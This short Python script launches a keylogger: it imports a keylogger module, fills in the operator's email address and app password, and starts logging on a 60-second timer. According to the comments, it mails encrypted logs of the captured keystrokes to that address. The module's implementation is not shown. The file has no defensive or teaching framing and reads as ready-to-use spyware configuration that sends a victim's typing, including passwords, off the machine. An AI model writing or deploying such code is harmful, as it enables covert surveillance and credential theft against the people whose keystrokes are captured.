import keylogger
import time

if __name__ == '__main__':

    #Set Up Variables
    timer = 60      # Set duration (in seconds) after which the keylogger will send the encrypted logs via mail 
    your_email = '' # Enter your email in which you want to recieve the logs
    email_pass = '' # Enter the app password after configuring 2-step verification for your mail

    my_keylogger = keylogger.KeyLogger(interval=timer, email=your_email, password=email_pass)
    my_keylogger.start()
